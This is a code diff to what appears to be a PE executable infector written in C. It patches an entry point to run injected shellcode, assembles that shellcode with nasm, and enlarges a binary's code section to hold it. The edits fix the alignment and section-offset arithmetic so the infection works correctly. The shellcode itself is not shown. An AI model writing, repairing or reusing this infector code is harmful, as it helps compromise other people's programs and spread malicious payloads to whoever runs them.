@@ -1,7 +1,7 @@
 #include "peInfect.h"
 
 static size_t align(size_t size, size_t alignment) {
-  return ((size >> 0x9) + alignment);
+  return ((size + (alignment - 1)) & -alignment);
 }
 
 static int  patchShellcode(file *shellcode, uint32_t entryPoint, uint32_t oldEntryPoint) {
@@ -45,7 +45,7 @@ static int  getShellcode(file *bin, uint32_t alignment) {
   int         fd;
   struct stat stats;
 
-  if (system("nasm -o shellcode -f bin srcs/shellcode.s") == -1)
+  if (system("nasm -f bin -o shellcode srcs/shellcode.s") == -1)
     return (-1);
   if (stat("shellcode", &stats) == -1)
     return (-1);
@@ -111,7 +111,7 @@ static int  resizeCodeSection(file *bin, file shellcode) {
   while (i < bin->header->shnum) {
     shHeader = ((void *)optHeader) + bin->header->optHeaderSize + sizeof(PE64_Shdr) * i;
     if (shHeader->paddr > codeSection->paddr + (codeSection->memsz - align(shellcode.size, optHeader->fileAlignment)))
-      shHeader->paddr += optHeader->fileAlignment;
+      shHeader->paddr += align(shellcode.size, optHeader->fileAlignment);
     i += 1;
   }
   return (0);
